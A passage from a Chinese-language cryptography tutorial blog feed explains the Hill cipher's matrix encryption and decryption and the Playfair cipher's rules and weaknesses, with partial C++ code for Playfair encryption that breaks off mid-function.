&lt;h2 id="0x02-hill-密码">0x02 Hill 密码&lt;/h2>
&lt;h3 id="21-加密过程">2.1 加密过程&lt;/h3>
&lt;p>首先给定一个密码矩阵 &lt;em>A&lt;/em>。
$$
A=\begin{bmatrix}
1 &amp;amp; 2 \\ 3 &amp;amp; 4
\end{bmatrix}
$$&lt;/p>
&lt;p>再给出明文：&lt;em>The quick brown fox jumps over the lazy dog&lt;/em>&lt;/p>
&lt;p>将明文转换成数字（ASCII），两个一组。比如 &lt;code>Th&lt;/code> 就是 &lt;code>84 104&lt;/code> ，写成矩阵形式就是这样。&lt;/p>
&lt;p>$$
P=\begin{bmatrix}
84 \\ 104
\end{bmatrix}
$$&lt;/p>
&lt;p>将密码矩阵 &lt;em>A&lt;/em> 左乘明文矩阵 &lt;em>P&lt;/em> ，&lt;em>C=AP&lt;/em>，我们就得到了密文。&lt;/p>
&lt;p>$$
C=AP=\begin{bmatrix}
1 &amp;amp; 2 \\ 3 &amp;amp; 4
\end{bmatrix}
\begin{bmatrix}
84 \\ 104
\end{bmatrix}=
\begin{bmatrix}
292 \\ 668
\end{bmatrix}
$$&lt;/p>
&lt;h3 id="22-解密过程">2.2 解密过程&lt;/h3>
&lt;p>解密过程就是利用密码矩阵的逆矩阵 &lt;em>A&lt;sup>-1&lt;/sup>&lt;/em> ，从密文求明文的过程，公式 &lt;em>A&lt;sup>-1&lt;/sup>C=A&lt;sup>-1&lt;/sup>AP&lt;/em> 。&lt;/p>
&lt;p>2x2 矩阵的逆矩阵求解方法看前面 1.9，求得逆矩阵如下。&lt;/p>
&lt;p>$$
A^{-1}=\begin{bmatrix}
-2 &amp;amp; 1 \\ 1.5 &amp;amp; -0.5
\end{bmatrix}
$$&lt;/p>
&lt;p>然后使用逆矩阵左乘密文：&lt;/p>
&lt;p>$$
P=A^{-1}C=\begin{bmatrix}
-2 &amp;amp; 1 \\ 1.5 &amp;amp; -0.5
\end{bmatrix}
\begin{bmatrix}
292 \\ 668
\end{bmatrix}=
\begin{bmatrix}
84 \\ 104
\end{bmatrix}
$$&lt;/p>
&lt;p>即可得到明文。&lt;/p>
&lt;h3 id="23-安全性">2.3 安全性&lt;/h3>
&lt;p>Hill密码的安全性体现在隐藏了单个字母的频率信息，加密矩阵越大效果越好。&lt;/p>
&lt;p>Hill密码无法抵抗已知明文攻击，已知明文和密文时完全可以计算出加密矩阵。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>重点：&lt;/p>
&lt;ol>
&lt;li>矩阵乘法、单位矩阵、行列式和逆矩阵&lt;/li>
&lt;/ol>
&lt;p>Hill密码是将明文转为矩阵后和加密矩阵相乘，加密矩阵即为加密密钥，加密矩阵越大效果越好。解密使用加密矩阵的逆矩阵作为密钥。&lt;/p>
&lt;p>Hill 密码能隐藏字母频率信息，对抗仅密文分析，但无法对抗已知明文分析。&lt;/p></description></item><item><title>密码学入门02 - 古典密码#2</title><link>https://nnnewb.github.io/blog/p/cryptography-introduction-02/</link><pubDate>Thu, 11 Nov 2021 16:53:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/cryptography-introduction-02/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/cryptography-introduction-02/cover.jpg" alt="Featured image of post 密码学入门02 - 古典密码#2" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>从单表代替密码开始，继续学习古典密码。&lt;/p>
&lt;h2 id="0x01-playfair-密码">0x01 playfair 密码&lt;/h2>
&lt;p>&lt;em>playfair&lt;/em> 这个词乍一听我甚至有点迷惑，啥意思，公平竞赛吗。之后才知道原来是人名。&lt;/p>
&lt;h3 id="概述">概述&lt;/h3>
&lt;p>playfair 密码是最著名的多字母代替密码，它把明文中的字母对转换成密文的字母对，每次加密输入两个字母，输出两个字母。&lt;/p>
&lt;p>playfair 算法基于一个由密钥词构成的 5x5 字母矩阵，将密钥词去除重复字母后，和字母表剩余的字母按左至右、上至下的顺序填充进表里。&lt;/p>
&lt;p>举例来说，用 &lt;code>pojie&lt;/code> 作为密钥词。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>p&lt;/td>
&lt;td>o&lt;/td>
&lt;td>j&lt;/td>
&lt;td>i&lt;/td>
&lt;td>e&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>a&lt;/td>
&lt;td>b&lt;/td>
&lt;td>c&lt;/td>
&lt;td>d&lt;/td>
&lt;td>f&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>g/h&lt;/td>
&lt;td>k&lt;/td>
&lt;td>l&lt;/td>
&lt;td>m&lt;/td>
&lt;td>n&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>q&lt;/td>
&lt;td>r&lt;/td>
&lt;td>s&lt;/td>
&lt;td>t&lt;/td>
&lt;td>u&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>v&lt;/td>
&lt;td>w&lt;/td>
&lt;td>x&lt;/td>
&lt;td>y&lt;/td>
&lt;td>z&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>需要注意的是字母表有26个字母，但 playfair 的字母矩阵只有 25 个空格。出现字母表不是 5 的整数倍的情况时可以选择将多出来的字母视作同一个，或者去掉不常用的字母，使其正好填满矩阵。比如图中的&lt;code>g&lt;/code>/&lt;code>h&lt;/code>，好孩子不要学哦。常见的情况是&lt;code>i&lt;/code>/&lt;code>j&lt;/code>或者去掉&lt;code>z&lt;/code>或&lt;code>q&lt;/code>。&lt;/p>
&lt;h3 id="加密过程">加密过程&lt;/h3>
&lt;p>加密过程如下。&lt;/p>
&lt;p>第一步：将明文分成两个字母一组，两个字母重复的话就在中间填&lt;code>x&lt;/code>重新分组；如果最后剩下一个字母的话，也添加&lt;code>x&lt;/code>分成一组。举例来说，对单词&lt;code>balloon&lt;/code>，直接分组的话就是&lt;code>ba&lt;/code>、&lt;code>ll&lt;/code>、&lt;code>on&lt;/code>，填&lt;code>x&lt;/code>重新分组就是&lt;code>ba&lt;/code>、&lt;code>lx&lt;/code>、&lt;code>lo&lt;/code>、&lt;code>on&lt;/code>。&lt;/p>
&lt;p>分组后，对每个组进行加密，依然是 &lt;code>balloon&lt;/code> 为例。首先第一组 &lt;code>ba&lt;/code>。&lt;/p>
&lt;p>第二步：找出两个字母在上面表格里的行列坐标。&lt;/p>
&lt;ul>
&lt;li>&lt;code>b&lt;/code> 是第 2 行第 2 列。&lt;/li>
&lt;li>&lt;code>a&lt;/code> 是第 1 行第 2 列。&lt;/li>
&lt;/ul>
&lt;p>第三步：按规则选择代替的字母&lt;/p>
&lt;ul>
&lt;li>如果两个字母不同行也不同列，则选择本字母所在行、分组中另一个字母所在列的字母代替。&lt;/li>
&lt;li>如果两个字母在同一行，则选择明文右边的字母代替。明文在最右边则由最左边的字母代替。&lt;/li>
&lt;li>如果两个字母在同一列，则选择明文下边的字母代替。明文在最底下则由最上边的字母代替。&lt;/li>
&lt;/ul>
&lt;p>比如 &lt;code>balloon&lt;/code> 加密后，就是 &lt;code>bcsjkjek&lt;/code> 。&lt;/p>
&lt;h3 id="特点">特点&lt;/h3>
&lt;p>playfair 有 26x26 个字母对，因此识别出单个字母对相对简单的单表代替算法要困难得多。字母对的相对频率比字母的相对频率变化幅度小，利用频率分析字母对更困难。&lt;/p>
&lt;p>playfair 仍然是相对容易攻破的，因为它的密文仍然完好保留了明文语言的大部分结构特征，几百个字母的密文就足够分析出规律了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-02/image-20211111144837847.png"
width="1325"
height="787"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-02/image-20211111144837847_hu40999a0266ccbfe450f46cc822fe186a_187757_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-02/image-20211111144837847_hu40999a0266ccbfe450f46cc822fe186a_187757_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211111144837847"
class="gallery-image"
data-flex-grow="168"
data-flex-basis="404px"
>&lt;/p>
&lt;p>图中显示了 playfair 密码和其他一些密码加密的有效性，标有明文的曲线画出了超过从7w个字母的文章中得到的频率分布。曲线代表这样的含义：对文章中出现的每个字母计数，计数结果除以使用频率最高的字母出现次数。假设使用频率最高的字母 &lt;code>e&lt;/code> 出现的频率为 1 ，那么 &lt;code>t&lt;/code> 出现的频率就是 &lt;code>0.76&lt;/code> 等等。&lt;/p>
&lt;p>图中的横轴表示字母，纵轴表示字母出现的频率。 曲线体现了加密后字母频率分布被掩盖的程度。如果频率分布的信息完全被加密过程给隐藏了，那么密文的频率曲线应该是一条水平的线，唯密文密码分析由此下手将一无所获。&lt;/p>
&lt;p>图中所示的频率曲线表明 playfair 密码虽然有比明文稍平坦的频率分布曲线，但仍然透露了大量信息给密码分析者。&lt;/p>
&lt;h3 id="代码实现">代码实现&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;algorithm&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;array&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cctype&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstddef&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstdlib&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iterator&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;ostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;set&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unordered_set&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;utility&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">constexpr&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lowercase&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;abcdefghijklmnopqrstuvwxyz&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 保持顺序的情况下，对输入文本去重，并且从文本里把字符j替换成i
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">my_unique&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">ret&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="sc">&amp;#39;j&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">unordered_set&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">stable_partition&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">ret&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">n&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">bool&lt;/span> &lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// not exists
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">ret&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="n">ret&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">erase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">last&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ret&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">ret&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 从密钥字符串构造出 playfair 密钥矩阵
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">playfair_matrix&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 初始化密钥，构造的密钥中没有 j，加密时 j 视作 i 处理
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">fullkey&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">my_unique&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">lowercase&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fullkey&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cerr&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;invalid key length&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 构造矩阵
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">matrix&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">c&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">fullkey&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">matrix&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">count&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="o">++&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">matrix&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 用迭代器读取一组两个字符（从当前位置开始，*iter 和 *(iter+1) 为一组）。
&lt;/span>&lt;span class="c1">// 如果后续两个字符重复，则取一个字符加上 x 返回；
&lt;/span>&lt;span class="c1">// 如果后续仅剩一个字符也加上 x 返回。
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">next2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">const_iterator&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">it&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">const_iterator&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">ret&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">it&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">end&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">it&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">it&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ret&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tolower&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">it&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="n">ret&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;x&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ret&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tolower&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">it&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="n">ret&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tolower&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">it&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">ret&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 获得字符在密钥矩阵中的坐标，返回 (行,列)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">pair&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">get_row_col&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">matrix&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">r&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">matrix&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">const&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">matrix&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">row&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">find&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">col&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">row&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">npos&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">make_pair&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">col&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">make_pair&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// playfair 加密函数
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">playfair_cipher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">ciphertext&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">matrix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">playfair_matrix&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">it&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">cbegin&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">it&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">cend&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">char_pair&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">next2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">it&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">cend&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">c1_pos&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_row_col&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">matrix&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">char_pair&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;j&amp;#39;&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">char_pair&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
